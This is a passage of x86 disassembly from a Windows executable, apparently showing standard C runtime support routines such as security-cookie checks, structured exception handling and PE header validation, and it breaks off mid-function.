  40905a:	mov    edi,DWORD PTR [esi]
  40905c:	test   edi,edi
  40905e:	je     0x40906a
  409060:	mov    ecx,edi
  409062:	call   DWORD PTR ds:0x40e20c
  409068:	call   edi
  40906a:	add    esi,0x4
  40906d:	cmp    esi,DWORD PTR [ebp+0xc]
  409070:	jb     0x409056
  409072:	pop    edi
  409073:	mov    ecx,DWORD PTR [ebp-0x4]
  409076:	xor    ecx,ebp
  409078:	pop    esi
  409079:	call   0x409090
  40907e:	mov    esp,ebp
  409080:	pop    ebp
  409081:	ret    
  409082:	int3   
  409083:	int3   
  409084:	int3   
  409085:	int3   
  409086:	int3   
  409087:	int3   
  409088:	int3   
  409089:	int3   
  40908a:	int3   
  40908b:	int3   
  40908c:	int3   
  40908d:	int3   
  40908e:	int3   
  40908f:	int3   
  409090:	cmp    ecx,DWORD PTR ds:0x40b000
  409096:	jne    0x40909b
  409098:	ret    0x0
  40909b:	jmp    0x40918e
  4090a0:	int3   
  4090a1:	int3   
  4090a2:	int3   
  4090a3:	int3   
  4090a4:	int3   
  4090a5:	push   0x18
  4090a7:	push   0x409f38
  4090ac:	call   0x409a1c
  4090b1:	and    DWORD PTR [ebp-0x28],0x0
  4090b5:	mov    eax,ds:0x40cff0
  4090ba:	mov    DWORD PTR [ebp-0x20],eax
  4090bd:	cmp    eax,0xffffffff
  4090c0:	jne    0x4090d8
  4090c2:	push   DWORD PTR [ebp+0x8]
  4090c5:	mov    esi,DWORD PTR ds:0x40e1c4
  4090cb:	mov    ecx,esi
  4090cd:	call   DWORD PTR ds:0x40e20c
  4090d3:	call   esi
  4090d5:	pop    ecx
  4090d6:	jmp    0x40912c
  4090d8:	push   0x8
  4090da:	call   0x409aaa
  4090df:	pop    ecx
  4090e0:	and    DWORD PTR [ebp-0x4],0x0
  4090e4:	mov    eax,ds:0x40cff0
  4090e9:	mov    DWORD PTR [ebp-0x20],eax
  4090ec:	mov    eax,ds:0x40cfec
  4090f1:	mov    DWORD PTR [ebp-0x24],eax
  4090f4:	lea    eax,[ebp-0x24]
  4090f7:	push   eax
  4090f8:	lea    eax,[ebp-0x20]
  4090fb:	push   eax
  4090fc:	push   DWORD PTR [ebp+0x8]
  4090ff:	call   0x409ac2
  409104:	add    esp,0xc
  409107:	mov    esi,eax
  409109:	mov    DWORD PTR [ebp-0x28],esi
  40910c:	mov    ecx,DWORD PTR [ebp-0x20]
  40910f:	mov    DWORD PTR ds:0x40cff0,ecx
  409115:	mov    ecx,DWORD PTR [ebp-0x24]
  409118:	mov    DWORD PTR ds:0x40cfec,ecx
  40911e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  409125:	call   0x409135
  40912a:	mov    eax,esi
  40912c:	call   0x409a64
  409131:	ret    
  409132:	mov    esi,DWORD PTR [ebp-0x28]
  409135:	push   0x8
  409137:	call   0x409ab6
  40913c:	pop    ecx
  40913d:	ret    
  40913e:	int3   
  40913f:	int3   
  409140:	int3   
  409141:	int3   
  409142:	int3   
  409143:	mov    edi,edi
  409145:	push   ebp
  409146:	mov    ebp,esp
  409148:	push   DWORD PTR [ebp+0x8]
  40914b:	call   0x4090a5
  409150:	neg    eax
  409152:	pop    ecx
  409153:	sbb    eax,eax
  409155:	neg    eax
  409157:	dec    eax
  409158:	pop    ebp
  409159:	ret    
  40915a:	int3   
  40915b:	int3   
  40915c:	int3   
  40915d:	int3   
  40915e:	int3   
  40915f:	mov    edi,edi
  409161:	push   ebp
  409162:	mov    ebp,esp
  409164:	push   0x0
  409166:	call   DWORD PTR ds:0x40e154
  40916c:	push   DWORD PTR [ebp+0x8]
  40916f:	call   DWORD PTR ds:0x40e108
  409175:	push   0xc0000409
  40917a:	call   DWORD PTR ds:0x40e08c
  409180:	push   eax
  409181:	call   DWORD PTR ds:0x40e150
  409187:	pop    ebp
  409188:	ret    
  409189:	int3   
  40918a:	int3   
  40918b:	int3   
  40918c:	int3   
  40918d:	int3   
  40918e:	mov    edi,edi
  409190:	push   ebp
  409191:	mov    ebp,esp
  409193:	sub    esp,0x324
  409199:	mov    ds:0x40c1f0,eax
  40919e:	mov    DWORD PTR ds:0x40c1ec,ecx
  4091a4:	mov    DWORD PTR ds:0x40c1e8,edx
  4091aa:	mov    DWORD PTR ds:0x40c1e4,ebx
  4091b0:	mov    DWORD PTR ds:0x40c1e0,esi
  4091b6:	mov    DWORD PTR ds:0x40c1dc,edi
  4091bc:	data16 mov WORD PTR ds:0x40c208,ss
  4091c3:	data16 mov WORD PTR ds:0x40c1fc,cs
  4091ca:	data16 mov WORD PTR ds:0x40c1d8,ds
  4091d1:	data16 mov WORD PTR ds:0x40c1d4,es
  4091d8:	data16 mov WORD PTR ds:0x40c1d0,fs
  4091df:	data16 mov WORD PTR ds:0x40c1cc,gs
  4091e6:	pushf  
  4091e7:	pop    DWORD PTR ds:0x40c200
  4091ed:	mov    eax,DWORD PTR [ebp+0x0]
  4091f0:	mov    ds:0x40c1f4,eax
  4091f5:	mov    eax,DWORD PTR [ebp+0x4]
  4091f8:	mov    ds:0x40c1f8,eax
  4091fd:	lea    eax,[ebp+0x8]
  409200:	mov    ds:0x40c204,eax
  409205:	mov    eax,DWORD PTR [ebp-0x324]
  40920b:	mov    DWORD PTR ds:0x40c140,0x10001
  409215:	mov    eax,ds:0x40c1f8
  40921a:	mov    ds:0x40c0fc,eax
  40921f:	mov    DWORD PTR ds:0x40c0f0,0xc0000409
  409229:	mov    DWORD PTR ds:0x40c0f4,0x1
  409233:	mov    DWORD PTR ds:0x40c100,0x3
  40923d:	push   0x4
  40923f:	pop    eax
  409240:	imul   eax,eax,0x0
  409243:	mov    DWORD PTR [eax+0x40c104],0x2
  40924d:	push   0x4
  40924f:	pop    eax
  409250:	shl    eax,0x0
  409253:	mov    ecx,DWORD PTR ds:0x40b000
  409259:	mov    DWORD PTR [eax+0x40c104],ecx
  40925f:	push   0x4
  409261:	pop    eax
  409262:	shl    eax,1
  409264:	mov    ecx,DWORD PTR ds:0x40b004
  40926a:	mov    DWORD PTR [eax+0x40c104],ecx
  409270:	push   0x4
  409272:	pop    eax
  409273:	imul   eax,eax,0x0
  409276:	mov    ecx,DWORD PTR ds:0x40b000
  40927c:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  409280:	push   0x4
  409282:	pop    eax
  409283:	shl    eax,0x0
  409286:	mov    ecx,DWORD PTR ds:0x40b004
  40928c:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  409290:	push   0x4011c0
  409295:	call   0x40915f
  40929a:	mov    esp,ebp
  40929c:	pop    ebp
  40929d:	ret    
  40929e:	int3   
  40929f:	int3   
  4092a0:	int3   
  4092a1:	int3   
  4092a2:	int3   
  4092a3:	mov    edi,edi
  4092a5:	push   ebp
  4092a6:	mov    ebp,esp
  4092a8:	mov    ds:0x40c1f0,eax
  4092ad:	mov    DWORD PTR ds:0x40c1ec,ecx
  4092b3:	mov    DWORD PTR ds:0x40c1e8,edx
  4092b9:	mov    DWORD PTR ds:0x40c1e4,ebx
  4092bf:	mov    DWORD PTR ds:0x40c1e0,esi
  4092c5:	mov    DWORD PTR ds:0x40c1dc,edi
  4092cb:	data16 mov WORD PTR ds:0x40c208,ss
  4092d2:	data16 mov WORD PTR ds:0x40c1fc,cs
  4092d9:	data16 mov WORD PTR ds:0x40c1d8,ds
  4092e0:	data16 mov WORD PTR ds:0x40c1d4,es
  4092e7:	data16 mov WORD PTR ds:0x40c1d0,fs
  4092ee:	data16 mov WORD PTR ds:0x40c1cc,gs
  4092f5:	pushf  
  4092f6:	pop    DWORD PTR ds:0x40c200
  4092fc:	mov    DWORD PTR ds:0x40c140,0x10001
  409306:	mov    eax,DWORD PTR [ebp+0x4]
  409309:	mov    ds:0x40c1f8,eax
  40930e:	lea    eax,[ebp+0x4]
  409311:	add    eax,0x4
  409314:	mov    ds:0x40c204,eax
  409319:	mov    eax,ds:0x40c1f8
  40931e:	mov    ds:0x40c0fc,eax
  409323:	mov    DWORD PTR ds:0x40c0f0,0xc0000409
  40932d:	mov    DWORD PTR ds:0x40c0f4,0x1
  409337:	mov    DWORD PTR ds:0x40c100,0x1
  409341:	push   0x4
  409343:	pop    eax
  409344:	imul   eax,eax,0x0
  409347:	mov    DWORD PTR [eax+0x40c104],0x8
  409351:	push   0x4011c0
  409356:	call   0x40915f
  40935b:	pop    ebp
  40935c:	ret    
  40935d:	int3   
  40935e:	int3   
  40935f:	int3   
  409360:	int3   
  409361:	int3   
  409362:	int3   
  409363:	int3   
  409364:	int3   
  409365:	int3   
  409366:	int3   
  409367:	int3   
  409368:	int3   
  409369:	int3   
  40936a:	int3   
  40936b:	int3   
  40936c:	int3   
  40936d:	int3   
  40936e:	int3   
  40936f:	int3   
  409370:	push   ebx
  409371:	push   esi
  409372:	push   edi
  409373:	mov    edx,DWORD PTR [esp+0x10]
  409377:	mov    eax,DWORD PTR [esp+0x14]
  40937b:	mov    ecx,DWORD PTR [esp+0x18]
  40937f:	push   ebp
  409380:	push   edx
  409381:	push   eax
  409382:	push   ecx
  409383:	push   ecx
  409384:	push   0x409400
  409389:	push   DWORD PTR fs:0x0
  409390:	mov    eax,ds:0x40b000
  409395:	xor    eax,esp
  409397:	mov    DWORD PTR [esp+0x8],eax
  40939b:	mov    DWORD PTR fs:0x0,esp
  4093a2:	mov    eax,DWORD PTR [esp+0x30]
  4093a6:	mov    ebx,DWORD PTR [eax+0x8]
  4093a9:	mov    ecx,DWORD PTR [esp+0x2c]
  4093ad:	xor    ebx,DWORD PTR [ecx]
  4093af:	mov    esi,DWORD PTR [eax+0xc]
  4093b2:	cmp    esi,0xfffffffe
  4093b5:	je     0x4093f2
  4093b7:	mov    edx,DWORD PTR [esp+0x34]
  4093bb:	cmp    edx,0xfffffffe
  4093be:	je     0x4093c4
  4093c0:	cmp    esi,edx
  4093c2:	jbe    0x4093f2
  4093c4:	lea    esi,[esi+esi*2]
  4093c7:	lea    ebx,[ebx+esi*4+0x10]
  4093cb:	mov    ecx,DWORD PTR [ebx]
  4093cd:	mov    DWORD PTR [eax+0xc],ecx
  4093d0:	cmp    DWORD PTR [ebx+0x4],0x0
  4093d4:	jne    0x4093a2
  4093d6:	push   0x101
  4093db:	mov    eax,DWORD PTR [ebx+0x8]
  4093de:	call   0x409ba1
  4093e3:	mov    ecx,0x1
  4093e8:	mov    eax,DWORD PTR [ebx+0x8]
  4093eb:	call   0x409bc0
  4093f0:	jmp    0x4093a2
  4093f2:	pop    DWORD PTR fs:0x0
  4093f9:	add    esp,0x18
  4093fc:	pop    edi
  4093fd:	pop    esi
  4093fe:	pop    ebx
  4093ff:	ret    
  409400:	mov    ecx,DWORD PTR [esp+0x4]
  409404:	test   DWORD PTR [ecx+0x4],0x6
  40940b:	mov    eax,0x1
  409410:	je     0x409445
  409412:	mov    eax,DWORD PTR [esp+0x8]
  409416:	mov    ecx,DWORD PTR [eax+0x8]
  409419:	xor    ecx,eax
  40941b:	call   0x409090
  409420:	push   ebp
  409421:	mov    ebp,DWORD PTR [eax+0x18]
  409424:	push   DWORD PTR [eax+0xc]
  409427:	push   DWORD PTR [eax+0x10]
  40942a:	push   DWORD PTR [eax+0x14]
  40942d:	call   0x409370
  409432:	add    esp,0xc
  409435:	pop    ebp
  409436:	mov    eax,DWORD PTR [esp+0x8]
  40943a:	mov    edx,DWORD PTR [esp+0x10]
  40943e:	mov    DWORD PTR [edx],eax
  409440:	mov    eax,0x3
  409445:	ret    
  409446:	push   ebp
  409447:	push   DWORD PTR [esp+0x8]
  40944b:	call   0x409b90
  409450:	add    esp,0x4
  409453:	mov    ecx,DWORD PTR [esp+0x8]
  409457:	mov    ebp,DWORD PTR [ecx]
  409459:	push   DWORD PTR [ecx+0x1c]
  40945c:	push   DWORD PTR [ecx+0x18]
  40945f:	push   DWORD PTR [ecx+0x28]
  409462:	call   0x409370
  409467:	add    esp,0xc
  40946a:	pop    ebp
  40946b:	ret    0x4
  40946e:	push   ebp
  40946f:	push   esi
  409470:	push   edi
  409471:	push   ebx
  409472:	mov    ebp,edx
  409474:	xor    eax,eax
  409476:	xor    ebx,ebx
  409478:	xor    edx,edx
  40947a:	xor    esi,esi
  40947c:	xor    edi,edi
  40947e:	call   ecx
  409480:	pop    ebx
  409481:	pop    edi
  409482:	pop    esi
  409483:	pop    ebp
  409484:	ret    
  409485:	mov    ebp,edx
  409487:	mov    esi,ecx
  409489:	mov    eax,ecx
  40948b:	push   0x1
  40948d:	call   0x409ba1
  409492:	xor    eax,eax
  409494:	xor    ebx,ebx
  409496:	xor    ecx,ecx
  409498:	xor    edx,edx
  40949a:	xor    edi,edi
  40949c:	jmp    esi
  40949e:	push   ebp
  40949f:	mov    ebp,esp
  4094a1:	push   ebx
  4094a2:	push   esi
  4094a3:	push   edi
  4094a4:	push   0x0
  4094a6:	push   0x0
  4094a8:	push   0x4094b3
  4094ad:	push   ecx
  4094ae:	call   0x409db0
  4094b3:	pop    edi
  4094b4:	pop    esi
  4094b5:	pop    ebx
  4094b6:	pop    ebp
  4094b7:	ret    
  4094b8:	push   ebp
  4094b9:	mov    ebp,DWORD PTR [esp+0x8]
  4094bd:	push   edx
  4094be:	push   ecx
  4094bf:	push   DWORD PTR [esp+0x14]
  4094c3:	call   0x409370
  4094c8:	add    esp,0xc
  4094cb:	pop    ebp
  4094cc:	ret    0x8
  4094cf:	int3   
  4094d0:	int3   
  4094d1:	int3   
  4094d2:	int3   
  4094d3:	int3   
  4094d4:	int3   
  4094d5:	int3   
  4094d6:	int3   
  4094d7:	int3   
  4094d8:	int3   
  4094d9:	int3   
  4094da:	int3   
  4094db:	int3   
  4094dc:	int3   
  4094dd:	int3   
  4094de:	int3   
  4094df:	int3   
  4094e0:	mov    edi,edi
  4094e2:	push   ebp
  4094e3:	mov    ebp,esp
  4094e5:	push   ebx
  4094e6:	mov    ebx,DWORD PTR [ebp+0x10]
  4094e9:	push   esi
  4094ea:	push   edi
  4094eb:	mov    edi,DWORD PTR [ebp+0xc]
  4094ee:	mov    eax,DWORD PTR [edi]
  4094f0:	cmp    eax,0xfffffffe
  4094f3:	je     0x40950b
  4094f5:	mov    esi,DWORD PTR [edi+0x4]
  4094f8:	mov    ecx,DWORD PTR [ebp+0x8]
  4094fb:	add    esi,ebx
  4094fd:	xor    esi,DWORD PTR [eax+ebx*1]
  409500:	call   DWORD PTR ds:0x40e20c
  409506:	mov    ecx,esi
  409508:	call   DWORD PTR [ebp+0x8]
  40950b:	mov    eax,DWORD PTR [edi+0x8]
  40950e:	mov    esi,DWORD PTR [edi+0xc]
  409511:	add    esi,ebx
  409513:	xor    esi,DWORD PTR [eax+ebx*1]
  409516:	mov    ebx,DWORD PTR [ebp+0x8]
  409519:	mov    ecx,ebx
  40951b:	call   DWORD PTR ds:0x40e20c
  409521:	mov    ecx,esi
  409523:	call   ebx
  409525:	pop    edi
  409526:	pop    esi
  409527:	pop    ebx
  409528:	pop    ebp
  409529:	ret    
  40952a:	int3   
  40952b:	int3   
  40952c:	int3   
  40952d:	int3   
  40952e:	int3   
  40952f:	int3   
  409530:	mov    edi,edi
  409532:	push   ebp
  409533:	mov    ebp,esp
  409535:	sub    esp,0x20
  409538:	mov    eax,ds:0x40b000
  40953d:	xor    eax,ebp
  40953f:	mov    DWORD PTR [ebp-0x4],eax
  409542:	mov    ecx,DWORD PTR [ebp+0x8]
  409545:	push   ebx
  409546:	push   esi
  409547:	mov    esi,DWORD PTR [ebp+0x14]
  40954a:	push   edi
  40954b:	mov    BYTE PTR [ebp-0x5],0x0
  40954f:	mov    DWORD PTR [ebp-0x10],0x1
  409556:	mov    ebx,DWORD PTR [esi+0x8]
  409559:	lea    eax,[esi+0x10]
  40955c:	xor    ebx,DWORD PTR [ecx]
  40955e:	push   eax
  40955f:	push   ebx
  409560:	push   DWORD PTR [ebp+0xc]
  409563:	mov    DWORD PTR [ebp-0x14],eax
  409566:	mov    DWORD PTR [ebp-0xc],ebx
  409569:	call   0x4094e0
  40956e:	mov    edi,DWORD PTR [ebp+0x18]
  409571:	push   edi
  409572:	call   0x409b90
  409577:	mov    eax,DWORD PTR [ebp+0x10]
  40957a:	add    esp,0x10
  40957d:	test   BYTE PTR [eax+0x4],0x66
  409581:	jne    0x40963e
  409587:	mov    DWORD PTR [ebp-0x20],eax
  40958a:	lea    eax,[ebp-0x20]
  40958d:	mov    DWORD PTR [ebp-0x1c],edi
  409590:	mov    edi,DWORD PTR [esi+0xc]
  409593:	mov    DWORD PTR [esi-0x4],eax
  409596:	cmp    edi,0xfffffffe
  409599:	je     0x409667
  40959f:	nop
  4095a0:	lea    eax,[edi+0x2]
  4095a3:	lea    eax,[edi+eax*2]
  4095a6:	mov    ecx,DWORD PTR [ebx+eax*4+0x4]
  4095aa:	lea    eax,[ebx+eax*4]
  4095ad:	mov    ebx,DWORD PTR [eax]
  4095af:	mov    DWORD PTR [ebp-0x18],eax
  4095b2:	test   ecx,ecx
  4095b4:	je     0x409617
  4095b6:	lea    edx,[esi+0x10]
  4095b9:	call   0x40946e
  4095be:	mov    cl,0x1
  4095c0:	mov    BYTE PTR [ebp-0x5],cl
  4095c3:	test   eax,eax
  4095c5:	js     0x409629
  4095c7:	jle    0x40961a
  4095c9:	mov    eax,DWORD PTR [ebp+0x10]
  4095cc:	cmp    DWORD PTR [eax],0xe06d7363
  4095d2:	jne    0x409609
  4095d4:	cmp    DWORD PTR ds:0x40cfe8,0x0
  4095db:	je     0x409609
  4095dd:	push   0x40cfe8
  4095e2:	call   0x409840
  4095e7:	add    esp,0x4
  4095ea:	test   eax,eax
  4095ec:	je     0x409609
  4095ee:	mov    esi,DWORD PTR ds:0x40cfe8
  4095f4:	mov    ecx,esi
  4095f6:	push   0x1
  4095f8:	push   DWORD PTR [ebp+0x10]
  4095fb:	call   DWORD PTR ds:0x40e20c
  409601:	call   esi
  409603:	mov    esi,DWORD PTR [ebp+0x14]
  409606:	add    esp,0x8
  409609:	mov    ecx,esi
  40960b:	call   0x40949e
  409610:	cmp    DWORD PTR [esi+0xc],edi
  409613:	je     0x40968b
  409615:	jmp    0x40967b
  409617:	mov    cl,BYTE PTR [ebp-0x5]
  40961a:	mov    edi,ebx
  40961c:	cmp    ebx,0xfffffffe
  40961f:	je     0x409635
  409621:	mov    ebx,DWORD PTR [ebp-0xc]
  409624:	jmp    0x4095a0
  409629:	mov    ebx,DWORD PTR [ebp-0xc]
  40962c:	mov    DWORD PTR [ebp-0x10],0x0
  409633:	jmp    0x409657
  409635:	test   cl,cl
  409637:	je     0x409667
  409639:	mov    ebx,DWORD PTR [ebp-0xc]
  40963c:	jmp    0x409657
  40963e:	cmp    DWORD PTR [esi+0xc],0xfffffffe
  409642:	je     0x409667
  409644:	push   DWORD PTR [ebp+0x8]
  409647:	lea    eax,[esi+0x10]
  40964a:	mov    ecx,esi
  40964c:	push   eax
  40964d:	mov    edx,0xfffffffe
  409652:	call   0x4094b8
  409657:	push   DWORD PTR [ebp-0x14]
  40965a:	mov    eax,DWORD PTR [ebp+0xc]
  40965d:	push   ebx
  40965e:	push   eax
  40965f:	call   0x4094e0
  409664:	add    esp,0xc
  409667:	mov    ecx,DWORD PTR [ebp-0x4]
  40966a:	mov    eax,DWORD PTR [ebp-0x10]
  40966d:	xor    ecx,ebp
  40966f:	pop    edi
  409670:	pop    esi
  409671:	pop    ebx
  409672:	call   0x409090
  409677:	mov    esp,ebp
  409679:	pop    ebp
  40967a:	ret    
  40967b:	push   DWORD PTR [ebp+0x8]
  40967e:	lea    eax,[esi+0x10]
  409681:	mov    edx,edi
  409683:	push   eax
  409684:	mov    ecx,esi
  409686:	call   0x4094b8
  40968b:	mov    eax,DWORD PTR [ebp+0xc]
  40968e:	mov    DWORD PTR [esi+0xc],ebx
  409691:	lea    ebx,[esi+0x10]
  409694:	push   ebx
  409695:	push   DWORD PTR [ebp-0xc]
  409698:	push   eax
  409699:	call   0x4094e0
  40969e:	mov    ecx,DWORD PTR [ebp-0x18]
  4096a1:	add    esp,0xc
  4096a4:	mov    edx,ebx
  4096a6:	mov    ecx,DWORD PTR [ecx+0x8]
  4096a9:	call   0x409485
  4096ae:	int3   
  4096af:	int3   
  4096b0:	int3   
  4096b1:	int3   
  4096b2:	int3   
  4096b3:	int3   
  4096b4:	int3   
  4096b5:	int3   
  4096b6:	int3   
  4096b7:	int3   
  4096b8:	int3   
  4096b9:	int3   
  4096ba:	int3   
  4096bb:	int3   
  4096bc:	int3   
  4096bd:	int3   
  4096be:	int3   
  4096bf:	int3   
  4096c0:	mov    edi,edi
  4096c2:	push   ebp
  4096c3:	mov    ebp,esp
  4096c5:	mov    eax,DWORD PTR [ebp+0x8]
  4096c8:	mov    eax,DWORD PTR [eax]
  4096ca:	cmp    DWORD PTR [eax],0xe06d7363
  4096d0:	jne    0x4096fd
  4096d2:	cmp    DWORD PTR [eax+0x10],0x3
  4096d6:	jne    0x4096fd
  4096d8:	mov    eax,DWORD PTR [eax+0x14]
  4096db:	cmp    eax,0x19930520
  4096e0:	je     0x4096f7
  4096e2:	cmp    eax,0x19930521
  4096e7:	je     0x4096f7
  4096e9:	cmp    eax,0x19930522
  4096ee:	je     0x4096f7
  4096f0:	cmp    eax,0x1994000
  4096f5:	jne    0x4096fd
  4096f7:	call   DWORD PTR ds:0x40e1d0
  4096fd:	xor    eax,eax
  4096ff:	pop    ebp
  409700:	ret    0x4
  409703:	int3   
  409704:	int3   
  409705:	int3   
  409706:	int3   
  409707:	int3   
  409708:	int3   
  409709:	int3   
  40970a:	int3   
  40970b:	int3   
  40970c:	int3   
  40970d:	int3   
  40970e:	int3   
  40970f:	int3   
  409710:	push   0x4096c0
  409715:	call   DWORD PTR ds:0x40e154
  40971b:	xor    eax,eax
  40971d:	ret    
  40971e:	int3   
  40971f:	int3   
  409720:	int3   
  409721:	int3   
  409722:	int3   
  409723:	int3   
  409724:	jmp    DWORD PTR ds:0x40e184
  40972a:	int3   
  40972b:	int3   
  40972c:	int3   
  40972d:	int3   
  40972e:	int3   
  40972f:	push   0xc
  409731:	push   0x409f58
  409736:	call   0x409bc8
  40973b:	xor    ecx,ecx
  40973d:	mov    eax,DWORD PTR [ebp+0x8]
  409740:	test   eax,eax
  409742:	je     0x40978f
  409744:	cmp    eax,0xffffffff
  409747:	je     0x40978f
  409749:	mov    DWORD PTR [ebp-0x4],ecx
  40974c:	mov    edx,0x5a4d
  409751:	cmp    WORD PTR [eax],dx
  409754:	jne    0x409788
  409756:	mov    edx,DWORD PTR [eax+0x3c]
  409759:	test   edx,edx
  40975b:	js     0x409788
  40975d:	cmp    edx,0x10000000
  409763:	jae    0x409788
  409765:	add    eax,edx
  409767:	mov    DWORD PTR [ebp-0x1c],eax
  40976a:	mov    ecx,DWORD PTR [eax]
  40976c:	sub    ecx,0x4550
  409772:	neg    ecx
  409774:	sbb    ecx,ecx
  409776:	not    ecx
  409778:	and    ecx,eax
  40977a:	jmp    0x409785
  40977c:	xor    eax,eax
  40977e:	inc    eax
  40977f:	ret    
  409780:	mov    esp,DWORD PTR [ebp-0x18]
  409783:	xor    ecx,ecx
  409785:	mov    DWORD PTR [ebp-0x1c],ecx
  409788:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40978f:	mov    eax,ecx
  409791:	call   0x409c0d
  409796:	ret    0x4
  409799:	int3   
  40979a:	int3   
  40979b:	int3   
  40979c:	int3   
  40979d:	int3   
  40979e:	mov    edi,edi
  4097a0:	push   ebp
  4097a1:	mov    ebp,esp
  4097a3:	push   0x0
  4097a5:	call   DWORD PTR ds:0x40e14c
  4097ab:	test   eax,eax
  4097ad:	je     0x4097cf
  4097af:	push   eax
  4097b0:	call   0x40972f
  4097b5:	test   eax,eax
  4097b7:	je     0x4097cf
  4097b9:	movzx  ecx,WORD PTR [eax+0x5c]
  4097bd:	push   0x2
  4097bf:	pop    eax
  4097c0:	cmp    cx,ax
  4097c3:	je     0x4097d2
  4097c5:	cmp    ecx,0x3
  4097c8:	jne    0x4097cf
  4097ca:	xor    eax,eax
  4097cc:	inc    eax
  4097cd:	pop    ebp
  4097ce:	ret    
  4097cf:	mov    eax,DWORD PTR [ebp+0x8]
  4097d2:	pop    ebp
  4097d3:	ret    
  4097d4:	int3   
  4097d5:	int3   
  4097d6:	int3   
  4097d7:	int3   
  4097d8:	int3   
  4097d9:	int3   
  4097da:	jmp    DWORD PTR ds:0x40e18c
  4097e0:	int3   
  4097e1:	int3   
  4097e2:	int3   
  4097e3:	int3   
  4097e4:	int3   
  4097e5:	int3   
  4097e6:	int3   
  4097e7:	int3   
  4097e8:	int3   
  4097e9:	int3   
  4097ea:	int3   
  4097eb:	int3   
  4097ec:	int3   
  4097ed:	int3   
  4097ee:	int3   
  4097ef:	int3   
  4097f0:	mov    edi,edi
  4097f2:	push   ebp
  4097f3:	mov    ebp,esp
  4097f5:	mov    eax,DWORD PTR [ebp+0x8]
  4097f8:	xor    edx,edx
  4097fa:	push   ebx
  4097fb:	push   esi
  4097fc:	push   edi
  4097fd:	mov    ecx,DWORD PTR [eax+0x3c]
  409800:	add    ecx,eax
  409802:	movzx  eax,WORD PTR [ecx+0x14]
  409806:	movzx  ebx,WORD PTR [ecx+0x6]
  40980a:	add    eax,0x18
  40980d:	add    eax,ecx
  40980f:	test   ebx,ebx
  409811:	je     0x40982e
  409813:	mov    edi,DWORD PTR [ebp+0xc]
  409816:	mov    esi,DWORD PTR [eax+0xc]
  409819:	cmp    edi,esi
  40981b:	jb     0x409826
  40981d:	mov    ecx,DWORD PTR [eax+0x8]
  409820:	add    ecx,esi
  409822:	cmp    edi,ecx
  409824:	jb     0x409830
  409826:	inc    edx
  409827:	add    eax,0x28
  40982a:	cmp    edx,ebx
  40982c:	jb     0x409816
  40982e:	xor    eax,eax
  409830:	pop    edi
  409831:	pop    esi
  409832:	pop    ebx
  409833:	pop    ebp
  409834:	ret    
  409835:	int3   
  409836:	int3   
  409837:	int3   
  409838:	int3   
  409839:	int3   
  40983a:	int3   
  40983b:	int3   
  40983c:	int3   
  40983d:	int3   
  40983e:	int3   
  40983f:	int3   
  409840:	mov    edi,edi
  409842:	push   ebp
  409843:	mov    ebp,esp
  409845:	push   0xfffffffe
  409847:	push   0x409f78
  40984c:	push   0x409a80
  409851:	mov    eax,fs:0x0
  409857:	push   eax
  409858:	sub    esp,0x8
  40985b:	push   ebx
  40985c:	push   esi
  40985d:	push   edi
  40985e:	mov    eax,ds:0x40b000
  409863:	xor    DWORD PTR [ebp-0x8],eax
  409866:	xor    eax,ebp
  409868:	push   eax
  409869:	lea    eax,[ebp-0x10]
  40986c:	mov    fs:0x0,eax
  409872:	mov    DWORD PTR [ebp-0x18],esp
  409875:	mov    DWORD PTR [ebp-0x4],0x0
  40987c:	push   0x400000
  409881:	call   0x409910
  409886:	add    esp,0x4
  409889:	test   eax,eax
  40988b:	je     0x4098e1
  40988d:	mov    eax,DWORD PTR [ebp+0x8]
  409890:	sub    eax,0x400000
  409895:	push   eax
  409896:	push   0x400000
  40989b:	call   0x4097f0
  4098a0:	add    esp,0x8
  4098a3:	test   eax,eax
  4098a5:	je     0x4098e1
  4098a7:	mov    eax,DWORD PTR [eax+0x24]
  4098aa:	shr    eax,0x1f
  4098ad:	not    eax
  4098af:	and    eax,0x1
  4098b2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4098b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4098bc:	mov    DWORD PTR fs:0x0,ecx
  4098c3:	pop    ecx
  4098c4:	pop    edi
  4098c5:	pop    esi
  4098c6:	pop    ebx
  4098c7:	mov    esp,ebp
  4098c9:	pop    ebp
  4098ca:	ret    
  4098cb:	mov    eax,DWORD PTR [ebp-0x14]
  4098ce:	mov    eax,DWORD PTR [eax]
  4098d0:	xor    ecx,ecx
  4098d2:	cmp    DWORD PTR [eax],0xc0000005
  4098d8:	sete   cl
  4098db:	mov    eax,ecx
  4098dd:	ret    
  4098de:	mov    esp,DWORD PTR [ebp-0x18]
  4098e1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4098e8:	xor    eax,eax
  4098ea:	mov    ecx,DWORD PTR [ebp-0x10]
  4098ed:	mov    DWORD PTR fs:0x0,ecx
  4098f4:	pop    ecx
  4098f5:	pop    edi
  4098f6:	pop    esi
  4098f7:	pop    ebx
  4098f8:	mov    esp,ebp
  4098fa:	pop    ebp
  4098fb:	ret    
  4098fc:	int3   
  4098fd:	int3   
  4098fe:	int3   
  4098ff:	int3   
  409900:	int3   
  409901:	int3   
  409902:	int3   
  409903:	int3   
  409904:	int3   
  409905:	int3   
  409906:	int3   
  409907:	int3   
  409908:	int3   
  409909:	int3   
  40990a:	int3   
  40990b:	int3   
  40990c:	int3   
  40990d:	int3   
  40990e:	int3   
  40990f:	int3   
  409910:	mov    edi,edi
  409912:	push   ebp
  409913:	mov    ebp,esp
  409915:	mov    eax,DWORD PTR [ebp+0x8]
  409918:	mov    ecx,0x5a4d
  40991d:	cmp    WORD PTR [eax],cx
  409920:	je     0x409926
  409922:	xor    eax,eax
  409924:	pop    ebp
  409925:	ret    
  409926:	mov    ecx,DWORD PTR [eax+0x3c]
  409929:	add    ecx,eax
  40992b:	xor    eax,eax
  40992d:	cmp    DWORD PTR [ecx],0x4550
  409933:	jne    0x409941
  409935:	mov    edx,0x10b
  40993a:	cmp    WORD PTR [ecx+0x18],dx
  40993e:	sete   al
  409941:	pop    ebp
  409942:	ret    
  409943:	int3   
  409944:	int3   
  409945:	int3   
  409946:	int3   
  409947:	int3   
  409948:	mov    edi,edi
  40994a:	push   ebp
  40994b:	mov    ebp,esp
  40994d:	sub    esp,0x14
  409950:	and    DWORD PTR [ebp-0xc],0x0
  409954:	and    DWORD PTR [ebp-0x8],0x0
